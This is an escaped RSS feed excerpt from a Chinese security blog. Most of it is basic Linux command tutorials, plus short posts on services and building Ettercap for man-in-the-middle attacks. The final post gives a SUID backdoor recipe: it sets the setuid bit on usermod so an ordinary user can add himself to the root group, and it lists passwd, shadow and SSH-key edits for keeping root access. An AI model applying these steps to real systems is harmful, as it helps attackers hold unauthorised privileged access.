&lt;pre tabindex="0">&lt;code>[wyb@localhost tmp]$ ls
a a.txt
[wyb@localhost tmp]$ ls -l
total 4
drwxr-xr-x. 2 wyb root 4096 Apr 17 18:23 a
-rw-r--r--. 1 wyb root 0 Apr 17 18:23 a.txt
[wyb@localhost tmp]$ ls -a
. .. a a.txt .esd-500 .ICE-unix
[wyb@localhost tmp]$ ls -al
total 20
drwxrwxrwt. 5 root root 4096 Apr 17 18:23 .
dr-xr-xr-x. 22 root root 4096 Apr 17 16:31 ..
drwxr-xr-x. 2 wyb root 4096 Apr 17 18:23 a
-rw-r--r--. 1 wyb root 0 Apr 17 18:23 a.txt
drwx------. 2 wyb wyb 4096 Apr 10 19:15 .esd-500
drwxrwxrwt. 2 root root 4096 Apr 17 16:31 .ICE-unix
&lt;/code>&lt;/pre>&lt;h3 id="0x02-pwd查看当前工作路径">0x02 pwd：查看当前工作路径&lt;/h3>
&lt;pre tabindex="0">&lt;code>[wyb@localhost ~]$ pwd 
/home/wyb
&lt;/code>&lt;/pre>&lt;h3 id="0x03-cd切换目录">0x03 cd：切换目录&lt;/h3>
&lt;pre tabindex="0">&lt;code>[wyb@localhost ~]$ ls
Desktop Documents Downloads Music Pictures Public Templates Videos
[wyb@localhost ~]$ cd Desktop/ //相对路径
[wyb@localhost Desktop]$ cd /tmp/a //绝对路径
[wyb@localhost a]$ pwd
/tmp/a
[wyb@localhost a]$ cd - //返回原来的目录
[wyb@localhost Desktop]$ pwd
/home/user/reber/Desktop
&lt;/code>&lt;/pre>&lt;h3 id="0x04-mkdir新建文件夹">0x04 mkdir：新建文件夹&lt;/h3>
&lt;pre tabindex="0">&lt;code>[wyb@localhost tmp]$ ls
a a.txt
[wyb@localhost tmp]$ mkdir bbb
[wyb@localhost tmp]$ ls
a a.txt bbb
&lt;/code>&lt;/pre>&lt;h3 id="0x05-touchvim新建文件">0x05 touch/vim：新建文件&lt;/h3>
&lt;pre tabindex="0">&lt;code>[wyb@localhost tmp]$ ls
a a.txt bbb
[wyb@localhost tmp]$ touch bbb.txt
[wyb@localhost tmp]$ ls
a a.txt bbb bbb.txt
&lt;/code>&lt;/pre>&lt;h3 id="0x06-rm删除文件">0x06 rm：删除文件&lt;/h3>
&lt;pre tabindex="0">&lt;code>[wyb@localhost tmp]$ ls
a a.txt bbb bbb.txt c.txt
[wyb@localhost tmp]$ rm c.txt //删除文件c.txt
[wyb@localhost tmp]$ ls
a a.txt bbb bbb.txt
[wyb@localhost tmp]$ rm a //删除文件夹a，结果不能删除
rm: cannot remove `a&amp;#39;: Is a directory
[wyb@localhost tmp]$ rm -r a //加上-r才能删除文件夹
[wyb@localhost tmp]$ ls
a.txt bbb bbb.txt
&lt;/code>&lt;/pre>&lt;h3 id="0x07-ifconfig查看网卡的信息">0x07 ifconfig：查看网卡的信息&lt;/h3>
&lt;pre tabindex="0">&lt;code>[wyb@localhost tmp]$ ifconfig
eth0 Link encap:Ethernet HWaddr 00:0C:29:56:B4:10 
 inet addr:192.168.63.131 Bcast:192.168.63.255 Mask:255.255.255.0
 inet6 addr: fe80::20c:29ff:fe56:b410/64 Scope:Link
 UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1
 RX packets:67099 errors:0 dropped:0 overruns:0 frame:0
 TX packets:34939 errors:0 dropped:0 overruns:0 carrier:0
 collisions:0 txqueuelen:1000 
 RX bytes:94042525 (89.6 MiB) TX bytes:1995748 (1.9 MiB)

lo Link encap:Local Loopback 
 inet addr:127.0.0.1 Mask:255.0.0.0
 inet6 addr: ::1/128 Scope:Host
 UP LOOPBACK RUNNING MTU:16436 Metric:1
 RX packets:0 errors:0 dropped:0 overruns:0 frame:0
 TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
 collisions:0 txqueuelen:0 
 RX bytes:0 (0.0 b) TX bytes:0 (0.0 b)
&lt;/code>&lt;/pre>&lt;h3 id="0x08-netstat查找网络连接信息">0x08 netstat：查找网络连接信息&lt;/h3>
&lt;pre tabindex="0">&lt;code>netstat -l //listen状态的
netstat -an //显示所有的连接信息，且以ip地址代替名称
netstat -t //显示tcp连接信息
netstat -u //显示udp连接信息
LISTENING	//监听端口状态
ESTABLSHED	//建立连接
CLOSE_WAIT	//对方主动断开连接，此时我方就会变为这个状态，我方要调用close()
TIME_WAIT	//我方主动调用close(),对方收到后变为CLOSE_WAIT
[root@localhost ~]# netstat -l -n
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address Foreign Address远程 State 
tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 所有ip均可连接22
tcp 0 0 127.0.0.1:631 0.0.0.0:* LISTEN
tcp 0 0 127.0.0.1:25 0.0.0.0:* LISTEN 只有127.0.0.1连接25端口
tcp 0 0 :::22 :::* LISTEN 
tcp 0 0 ::1:631 :::* LISTEN 
Active UNIX domain sockets (only servers)
Proto RefCnt Flags Type State I-Node Path
unix 2 [ ACC ] STREAM LISTENING 14229 public/cleanup
unix 2 [ ACC ] STREAM LISTENING 14236 private/tlsmgr
unix 2 [ ACC ] STREAM LISTENING 14240 private/rewrite
unix 2 [ ACC ] STREAM LISTENING 14244 private/bounce
unix 2 [ ACC ] STREAM LISTENING 14248 private/defer
&lt;/code>&lt;/pre>&lt;h3 id="0x09-nslookup查看dns信息">0x09 nslookup：查看DNS信息&lt;/h3>
&lt;pre tabindex="0">&lt;code>nslookup 查看ip和域名的相互映射
nslookup www.baidu.com //返回一些信息
&lt;/code>&lt;/pre>&lt;h3 id="0x0a-ping">0x0A ping&lt;/h3>
&lt;pre tabindex="0">&lt;code>ping -c 3 www.baidu.com //指定ping百度3次
&lt;/code>&lt;/pre>&lt;h3 id="0x0b-lastfinger查看近期的登陆信息">0x0B last/finger：查看近期的登陆信息&lt;/h3>
&lt;pre tabindex="0">&lt;code>[root@localhost ~]# last
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>[root@localhost ~]# finger
&lt;/code>&lt;/pre>&lt;h3 id="0x0c-find查找文件">0x0C find：查找文件&lt;/h3>
&lt;pre tabindex="0">&lt;code>which vim //查看可执行文件的位置
*which是通过 PATH环境变量到该路径内查找可执行文件，所以基本的功能是寻找可执行文件* 

whereis、locate也可查找文件,它们是使用数据库来搜索数据

find . -name 1.txt //查找当前文件夹及子目录下的1.txt、
find . -name *.txt //使用通配符
find /bin -perm 755 //返回的都是755权限的文件 
find /bin -perm 4755 //返回有gid(即s权限)的文件 2是gid
[wyb@localhost tmp]$ sudo find / -name *.log //根目录下查找名字以log结尾的文件
/var/spool/plymouth/boot.log
/var/log/wpa_supplicant.log
/var/log/dracut.log
/var/log/vmware-tools-upgrader.log
[wyb@localhost ~]$ find /bin -perm 755 | xargs ls -al //前一个命令的输出作为后一个命令的输入
-rwxr-xr-x. 1 root root 123 Feb 21 2013 /bin/alsaunmute
-rwxr-xr-x. 1 root root 27776 Jun 22 2012 /bin/arch
-rwxr-xr-x. 1 root root 26264 Jun 22 2012 /bin/basename
-rwxr-xr-x. 1 root root 938768 Feb 21 2013 /bin/bash
-rwxr-xr-x. 1 root root 48568 Jun 22 2012 /bin/cat
-rwxr-xr-x. 1 root root 55472 Jun 22 2012 /bin/chgrp
-rwxr-xr-x. 1 root root 52472 Jun 22 2012 /bin/chmod
&lt;/code>&lt;/pre>&lt;h3 id="0x0d-grep">0x0D grep&lt;/h3>
&lt;pre tabindex="0">&lt;code>//可以遍历查询mkr文件夹下含有字符串&amp;#34;reber&amp;#34;的文件及字符串所在行
reber@WYB:~$ grep -Rn &amp;#34;reber&amp;#34; mkdir 
mkr/cc:3:reber
mkr/a/a.txt:3:reber
mkr/a/b.txt:16:reber
mkr/b/xx:8:reber
&lt;/code>&lt;/pre>&lt;h3 id="0x0e-catnl">0x0E cat/nl&lt;/h3>
&lt;pre tabindex="0">&lt;code>前者显示
后者显示的同时有行号
[wyb@localhost tmp]$ cat &amp;gt; a.txt //创建文件同时写入数据
this is a.txt
^C
[wyb@localhost tmp]$ cat &amp;gt; b.txt
this is b.txt
^C
[wyb@localhost tmp]$ cat a.txt b.txt &amp;gt; c.txt //合并文件
[wyb@localhost tmp]$ cat c.txt 
this is a.txt
this is b.txt
[wyb@localhost tmp]$ cat -n c.txt //获取文件内容切添加行号
 1 this is a.txt
 2 this is b.txt
&lt;/code>&lt;/pre>&lt;h3 id="0x0f-head">0x0F head&lt;/h3>
&lt;pre tabindex="0">&lt;code>[wyb@localhost tmp]$ head /etc/passwd //默认显示前10行
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin

[wyb@localhost tmp]$ head -n 4 /etc/passwd //设置显示前4行
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin

[wyb@localhost tmp]$ head -c 100 d.txt //显示前100个字节
 1 this is a.txt
 2 this is b.txt
this is add content
 1 this is a.txt
 2 this is b.[wyb@localhost tmp]$ 
&lt;/code>&lt;/pre>&lt;h3 id="0x10-tail">0x10 tail&lt;/h3>
&lt;pre tabindex="0">&lt;code>[wyb@localhost tmp]$ tail -f a.txt //实时显示文件后10行
this is a.txt
111111
aaaaaa
^C

[wyb@localhost tmp]$ tail -n 3 d.txt //显示文件后3行
 1 this is a.txt
 2 this is b.txt
this is add content

[wyb@localhost tmp]$ tail -c 100 d.txt //显示后100个字节
 2 this is b.txt
this is add content
 1 this is a.txt
 2 this is b.txt
this is add content
[wyb@localhost tmp]$ 
&lt;/code>&lt;/pre>&lt;h3 id="0x11-scp">0x11 scp&lt;/h3>
&lt;pre tabindex="0">&lt;code>向远程服务器put文件和文件夹，默认就是22端口
scp -P 22 ./aa.txt reber@123.206.78.220:/home/reber
scp -r ./bb reber@123.206.78.220:/home/reber

从服务器下载文件和文件夹
scp -P 2222 ubuntu@123.22.38.215:/home/reber/a.txt D:/a.txt
scp -r -P 2222 ubuntu@123.22.38.215:/home/reber/test D:/test/
&lt;/code>&lt;/pre>&lt;h3 id="0x12-磁盘">0x12 磁盘&lt;/h3>
&lt;pre tabindex="0">&lt;code>fdisk /dev/sdb
sudo mkfs.ext3 /dev/sdb1
mount -t ext3 -o rw /dev/sdb1 /home/aaa //-o指定权限
&lt;/code>&lt;/pre>&lt;h3 id="0x13-时间同步">0x13 时间同步&lt;/h3>
&lt;pre tabindex="0">&lt;code>ntpdate time.nist.gov //需要root权限
&lt;/code>&lt;/pre>&lt;h3 id="0x14-下载">0x14 下载&lt;/h3>
&lt;pre tabindex="0">&lt;code>$ curl -o aa.xml http://wyb0.com/index.xml #可以访问网页，它同时还保存了文件，文件名为aa.xml
$ wget http://wyb0.com/index.xml #下载的文件名为index.xml
&lt;/code>&lt;/pre>&lt;h3 id="0x15-环境变量">0x15 环境变量&lt;/h3>
&lt;pre tabindex="0">&lt;code>$ env
&lt;/code>&lt;/pre>&lt;h3 id="0x16-压缩与解压缩">0x16 压缩与解压缩&lt;/h3>
&lt;ul>
&lt;li>tar
&lt;ul>
&lt;li>tar主要参数&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 主要参数&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-c 创建一个新的压缩文件
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-x 解压
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-t 查看压缩文件的内容
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-f 指定档案文件的名字
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-v 显示过程信息
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-r 增加文件到指定的包
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-C 指定解压后的路径
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-z 使用gzip
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-j 使用bzip2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-Z 使用compress
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>tar示例&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># tar用法示例&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ls
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>aaa
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ tar -cvf 1.tar aaa/ &lt;span style="color:#75715e">#打包不压缩&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>aaa/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>aaa/b.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>aaa/c.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>aaa/test.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>aaa/a.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ tar -zcvf 1.tar.gz aaa/ &lt;span style="color:#75715e">#打包且以gzip压缩&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>aaa/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>aaa/b.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>aaa/c.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>aaa/test.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>aaa/a.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ tar -jcvf 1.tar.bz2 aaa/ &lt;span style="color:#75715e">#打包且以bzip2压缩&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>aaa/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>aaa/b.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>aaa/c.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>aaa/test.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>aaa/a.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>tar -zxvf aa.tar.gz /home/aaa --exclude&lt;span style="color:#f92672">=&lt;/span>dir &lt;span style="color:#75715e">#排除目录&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ls -l
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>total &lt;span style="color:#ae81ff">24&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rw-r--r--. &lt;span style="color:#ae81ff">1&lt;/span> wyb root &lt;span style="color:#ae81ff">10240&lt;/span> Apr &lt;span style="color:#ae81ff">19&lt;/span> 07:47 1.tar
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rw-r--r--. &lt;span style="color:#ae81ff">1&lt;/span> wyb root &lt;span style="color:#ae81ff">265&lt;/span> Apr &lt;span style="color:#ae81ff">19&lt;/span> 07:48 1.tar.bz2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rw-r--r--. &lt;span style="color:#ae81ff">1&lt;/span> wyb root &lt;span style="color:#ae81ff">253&lt;/span> Apr &lt;span style="color:#ae81ff">19&lt;/span> 07:48 1.tar.gz
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>drwxr-xr-x. &lt;span style="color:#ae81ff">2&lt;/span> wyb root &lt;span style="color:#ae81ff">4096&lt;/span> Apr &lt;span style="color:#ae81ff">19&lt;/span> 07:22 aaa
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ file 1.tar.gz &lt;span style="color:#75715e">#查看文件类型&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>1.tar.gz: gzip compressed data, from Unix, last modified: Tue Apr &lt;span style="color:#ae81ff">19&lt;/span> 07:48:01 &lt;span style="color:#ae81ff">2016&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ tar -ztvf 1.tar.gz &lt;span style="color:#75715e">#查看压缩包内容&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>drwxr-xr-x wyb/root &lt;span style="color:#ae81ff">0&lt;/span> 2016-04-19 07:22 aaa/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rw-r--r-- wyb/root &lt;span style="color:#ae81ff">0&lt;/span> 2016-04-19 05:05 aaa/b.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rw-r--r-- wyb/root &lt;span style="color:#ae81ff">0&lt;/span> 2016-04-19 05:05 aaa/c.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rw-r--r-- wyb/root &lt;span style="color:#ae81ff">84&lt;/span> 2016-04-19 05:50 aaa/test.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rw-r--r-- wyb/root &lt;span style="color:#ae81ff">0&lt;/span> 2016-04-19 05:05 aaa/a.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ls
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>1.tar 1.tar.bz2 1.tar.gz aaa
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ rm -rf aaa/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ls
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>1.tar 1.tar.bz2 1.tar.gz
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ tar -zxvf 1.tar.gz &lt;span style="color:#75715e">#解压到当前目录&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>aaa/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>aaa/b.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>aaa/c.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>aaa/test.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>aaa/a.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ls
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>1.tar 1.tar.bz2 1.tar.gz aaa
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ls aaa/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>a.txt b.txt c.txt test.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ls /tmp/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>111.txt aa
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ tar -zxvf 1.tar.gz -C /tmp/aa &lt;span style="color:#75715e">#解压到指定路径&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>aaa/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>aaa/b.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>aaa/c.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>aaa/test.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>aaa/a.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>zip&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code># zip用法示例
[reber@localhost ~]$ ls aaa/
a.txt b.txt c.txt
[reber@localhost ~]$ zip -re aaa.zip aaa/ #加密压缩
Enter password: 
Verify password: 
 adding: aaa/ (stored 0%)
 adding: aaa/b.txt (stored 0%)
 adding: aaa/c.txt (stored 0%)
 adding: aaa/a.txt (stored 0%)
[reber@localhost ~]$ rm aaa/*
[reber@localhost ~]$ ls aaa/
[reber@localhost ~]$ unzip aaa.zip #解压缩
Archive: aaa.zip
[aaa.zip] aaa/b.txt password: 
 extracting: aaa/b.txt 
 extracting: aaa/c.txt 
 extracting: aaa/a.txt
&lt;/code>&lt;/pre></description></item><item><title>Linux 之服务和计划任务</title><link>https://wyb0.cn/posts/2016/linux-service-and-planning-tasks/</link><pubDate>Tue, 19 Apr 2016 10:03:07 +0000</pubDate><guid>https://wyb0.cn/posts/2016/linux-service-and-planning-tasks/</guid><description>&lt;h3 id="0x00-服务">0x00 服务：&lt;/h3>
&lt;p>在后台运行的软件就叫服务，参数一般为：start/stop/restart&lt;/p>
&lt;ul>
&lt;li>apache启动后默认降权&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>service httpd start实际调用的是/etc/init.d/httpd这个shell脚本
而/etc/init.d是软连接文件夹，实际在/etc/rc.d/init.d
[wyb@localhost ~]$ ls -al /etc/init.d
lrwxrwxrwx. 1 root root 11 Apr 11 02:54 /etc/init.d -&amp;gt; rc.d/init.d
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>
&lt;p>添加服务&lt;br>
将脚本放在/etc/init.d/下即可&lt;/p></description></item><item><title>利用 EtterCap 进行中间人攻击</title><link>https://wyb0.cn/posts/2016/linux-install-ettercap/</link><pubDate>Tue, 19 Apr 2016 00:00:00 +0000</pubDate><guid>https://wyb0.cn/posts/2016/linux-install-ettercap/</guid><description>&lt;h3 id="0x00-准备">0x00 准备&lt;/h3>
&lt;pre tabindex="0">&lt;code>操作系统：CentOS 
首先，ettercap 安装时需要 4 个依赖包，而且安装包里面也已经提供了 
执行：sudo yum groupinstall &amp;#34;Development tools&amp;#34; #源码安装软件就需要安装这个
使用 wget 下载 ettercap 源码
&lt;/code>&lt;/pre>&lt;h3 id="0x01-查看需要的依赖项">0x01 查看需要的依赖项&lt;/h3>
&lt;pre tabindex="0">&lt;code>[wyb@localhost ettercap-0.8.2]$ vim INSTALL

 #### Bundled libraries 
 Ettercap now bundles the following libraries with the source distribution: 
 libnet 1.1.6 
 curl 7.41.0 
 luajit 2.0.3 
 check 0.9.14 
[wyb@localhost ettercap-0.8.2]$ cd bundled_deps/ 
[wyb@localhost bundled_deps]$ ls 
check curl libnet luajit
&lt;/code>&lt;/pre>&lt;h3 id="0x02-安装依赖包">0x02 安装依赖包&lt;/h3>
&lt;ol>
&lt;li>安装check&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>[wyb@localhost check]$ cd check-0.9.14
[wyb@localhost check-0.9.14]$ ls
[wyb@localhost check-0.9.14]$ ./configure 
[wyb@localhost check-0.9.14]$ make
[wyb@localhost check-0.9.14]$ sudo make install
&lt;/code>&lt;/pre>&lt;ol start="2">
&lt;li>安装curl&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>[wyb@localhost check-0.9.14]$ cd ..
[wyb@localhost curl-7.41.0]$ cd curl/
[wyb@localhost curl-7.41.0]$ cd curl-7.41.0
[wyb@localhost curl-7.41.0]$ make
[wyb@localhost curl-7.41.0]$ sudo make install
&lt;/code>&lt;/pre>&lt;ol start="3">
&lt;li>安装libnet&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>[wyb@localhost curl-7.41.0]$ cd ../../libnet/
[wyb@localhost libnet]$ tar -zxvf libnet-1.1.6.tar.gz
[wyb@localhost libnet]$ cd libnet-1.1.6
[wyb@localhost libnet-1.1.6]$ ./configure 
[wyb@localhost libnet-1.1.6]$ make
[wyb@localhost libnet-1.1.6]$ sudo make install
&lt;/code>&lt;/pre>&lt;ol start="4">
&lt;li>安装luajit&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>[wyb@localhost luajit]$ tar -zxvf LuaJIT-2.0.3.tar.gz 
[wyb@localhost luajit]$ make
[wyb@localhost luajit]$ sudo make install
&lt;/code>&lt;/pre>&lt;ol start="5">
&lt;li>
&lt;p>安装ettercap&lt;/p></description></item><item><title>Linux 之 SUID 后门</title><link>https://wyb0.cn/posts/2016/linux-suid-back-door/</link><pubDate>Mon, 18 Apr 2016 20:03:07 +0000</pubDate><guid>https://wyb0.cn/posts/2016/linux-suid-back-door/</guid><description>&lt;p>SUID可以用来做后门，前提是你已经获取了root权限，且给予s权限的文件必须为二进制&lt;/p>
&lt;h3 id="0x00-为二进制文件添加s权限从而提升为root权限">0x00 为二进制文件添加s权限从而提升为root权限&lt;/h3>
&lt;ul>
&lt;li>写sudoers添加用户 &lt;code>//最佳方案&lt;/code>&lt;/li>
&lt;li>vim /etc/passwd &lt;code>//将uid和gid改为0&lt;/code>&lt;/li>
&lt;li>vim /etc/shadow &lt;code>//密文覆盖&lt;/code>&lt;/li>
&lt;li>vim root .ssh/证书文件 &lt;code>.ssh这个文件夹和证书的权限要正确，要和原来一致&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="0x01-suid主要作用可以是留后门">0x01 SUID主要作用可以是留后门&lt;/h3>
&lt;ul>
&lt;li>在root权限下给usermod一个s权限&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># which usermod #得到usermod的路径 &lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/usr/sbin/usermod
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># chmod u+s /usr/sbin/usermod&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># ls -l /usr/sbin/usermod&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rwsr-x---. &lt;span style="color:#ae81ff">1&lt;/span> root root &lt;span style="color:#ae81ff">98680&lt;/span> Dec &lt;span style="color:#ae81ff">7&lt;/span> &lt;span style="color:#ae81ff">2011&lt;/span> /usr/sbin/usermod
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>usermod给其他人一个x权限&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>root@localhost ~&lt;span style="color:#f92672">]&lt;/span>&lt;span style="color:#75715e"># chmod o+x /usr/sbin/usermod&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>root@localhost ~&lt;span style="color:#f92672">]&lt;/span>&lt;span style="color:#75715e"># ls -l /usr/sbin/usermod&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rwsr-x--x. &lt;span style="color:#ae81ff">1&lt;/span> root root &lt;span style="color:#ae81ff">98680&lt;/span> Dec &lt;span style="color:#ae81ff">7&lt;/span> &lt;span style="color:#ae81ff">2011&lt;/span> /usr/sbin/usermod
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>切换到普通用户wyb&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>wyb@localhost ~&lt;span style="color:#f92672">]&lt;/span>$ id wyb
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>uid&lt;span style="color:#f92672">=&lt;/span>500&lt;span style="color:#f92672">(&lt;/span>wyb&lt;span style="color:#f92672">)&lt;/span> gid&lt;span style="color:#f92672">=&lt;/span>500&lt;span style="color:#f92672">(&lt;/span>wyb&lt;span style="color:#f92672">)&lt;/span> groups&lt;span style="color:#f92672">=&lt;/span>500&lt;span style="color:#f92672">(&lt;/span>wyb&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>wyb@localhost ~&lt;span style="color:#f92672">]&lt;/span>$ usermod -g root wyb
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>wyb@localhost ~&lt;span style="color:#f92672">]&lt;/span>$ id wyb
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>uid&lt;span style="color:#f92672">=&lt;/span>500&lt;span style="color:#f92672">(&lt;/span>wyb&lt;span style="color:#f92672">)&lt;/span> gid&lt;span style="color:#f92672">=&lt;/span>0&lt;span style="color:#f92672">(&lt;/span>root&lt;span style="color:#f92672">)&lt;/span> groups&lt;span style="color:#f92672">=&lt;/span>0&lt;span style="color:#f92672">(&lt;/span>root&lt;span style="color:#f92672">)&lt;/span>
